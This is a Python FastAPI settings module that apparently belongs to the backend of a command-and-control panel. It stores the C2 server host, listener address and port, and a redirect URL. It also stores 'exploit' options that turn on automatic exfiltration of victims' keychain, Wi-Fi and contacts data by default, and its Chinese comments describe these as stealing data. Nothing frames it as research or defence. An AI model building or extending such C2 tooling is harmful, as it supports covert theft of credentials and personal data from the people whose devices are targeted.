from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from pydantic import BaseModel
from datetime import datetime
from typing import Optional, List

from ..database import get_db, Settings, create_notification
from ..auth import get_current_user

router = APIRouter(prefix="/api/settings", tags=["settings"], redirect_slashes=False)


class C2Settings(BaseModel):
    c2_host: str = ''
    listen_host: str = '0.0.0.0'
    listen_port: int = 8080
    redirect_url: str = ''


class ExploitSettings(BaseModel):
    auto_exfil: bool = True
    exfil_categories: list = ['keychain', 'wifi', 'contacts']
    poll_interval: int = 30


class SettingItem(BaseModel):
    key: str
    value: str
    description: Optional[str] = None


def _get_setting(db: Session, key: str, default: str = "") -> str:
    """从数据库读取单个设置值."""
    item = db.query(Settings).filter(Settings.key == key).first()
    return item.value if item else default


def _set_setting(db: Session, key: str, value: str, description: Optional[str] = None, updated_by: str = None):
    """写入或更新单个设置值."""
    item = db.query(Settings).filter(Settings.key == key).first()
    if item:
        item.value = value
        item.updated_by = updated_by
    else:
        item = Settings(key=key, value=value, description=description, updated_by=updated_by)
        db.add(item)
    db.commit()


@router.get("")
async def get_settings(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    """获取所有持久化设置，若数据库无值则返回默认值."""
    c2_host = _get_setting(db, "c2.c2_host", "")
    listen_host = _get_setting(db, "c2.listen_host", "0.0.0.0")
    listen_port = int(_get_setting(db, "c2.listen_port", "8080"))
    redirect_url = _get_setting(db, "c2.redirect_url", "")

    auto_exfil = _get_setting(db, "exploit.auto_exfil", "true").lower() == "true"
    exfil_categories_str = _get_setting(db, "exploit.exfil_categories", "keychain,wifi,contacts")
    exfil_categories = [c.strip() for c in exfil_categories_str.split(",") if c.strip()]
    poll_interval = int(_get_setting(db, "exploit.poll_interval", "30"))

    return {
        "c2": {
            "c2_host": c2_host,
            "listen_host": listen_host,
            "listen_port": listen_port,
            "redirect_url": redirect_url
        },
        "exploit": {
            "auto_exfil": auto_exfil,
            "exfil_categories": exfil_categories,
            "poll_interval": poll_interval
        }
    }


@router.put("/c2")
async def update_c2_settings(
    settings: C2Settings,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    username = current_user.username if current_user else None
    _set_setting(db, "c2.c2_host", settings.c2_host, "C2服务器地址", username)
    _set_setting(db, "c2.listen_host", settings.listen_host, "监听地址", username)
    _set_setting(db, "c2.listen_port", str(settings.listen_port), "监听端口", username)
    _set_setting(db, "c2.redirect_url", settings.redirect_url, "重定向URL", username)

    create_notification(
        db, "C2设置已更新", f"用户 {username} 修改了 C2 配置", "system"
    )

    return {"message": "C2 settings updated", "data": settings.dict()}


@router.put("/exploit")
async def update_exploit_settings(
    settings: ExploitSettings,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    username = current_user.username if current_user else None
    _set_setting(db, "exploit.auto_exfil", str(settings.auto_exfil).lower(), "自动窃取数据", username)
    _set_setting(db, "exploit.exfil_categories", ",".join(settings.exfil_categories), "窃取数据类别", username)
    _set_setting(db, "exploit.poll_interval", str(settings.poll_interval), "轮询间隔(秒)", username)

    create_notification(
        db, "漏洞设置已更新", f"用户 {username} 修改了漏洞利用配置", "system"
    )

    return {"message": "Exploit settings updated", "data": settings.dict()}


@router.get("/raw")
async def get_raw_settings(
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    """获取所有原始设置项（用于高级管理）."""
    items = db.query(Settings).order_by(Settings.key).all()
    return {"items": items}


@router.put("/raw/{key}")
async def update_raw_setting(
    key: str,
    item: SettingItem,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    _set_setting(db, key, item.value, item.description, current_user.username if current_user else None)
    return {"message": "Setting updated", "key": key, "value": item.value}
